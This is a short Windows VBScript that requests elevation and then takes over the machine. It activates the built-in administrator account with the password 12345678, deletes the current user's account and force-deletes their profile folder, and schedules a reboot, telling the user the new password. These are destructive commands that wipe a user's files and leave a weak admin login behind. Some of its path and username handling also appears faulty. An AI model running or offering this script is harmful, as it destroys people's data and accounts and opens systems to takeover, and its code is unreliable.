If Not WScript.Arguments.Named.Exists("elevate") Then
	CreateObject("Shell.Application").ShellExecute WScript.FullName _
	, """" & WScript.ScriptFullName & """ /elevate", "", "runas", 1
	WScript.Quit
End If

Set objShell = WScript.CreateObject("WScript.Shell")
Set objSysInfo = Createobject("ADSystemInfo")

objShell.Run "cmd /k net user administrator /active:yes"
objShell.Run "cmd /k net user administrator 12345678"
objShell.Run "cmd /k net user " & objSysInfo.UserName & " /delete"

objShell.Run "cmd /k RD /S /Q ""C:/Users/""" & objSysInfo.UserName

objShell.Run "cmd /k shutdown -r -t 60"

Wscript.Echo "The current user is: administrator, password is 12345678. Your computer will be restart afters 60 seconds. Please do not run this file again."
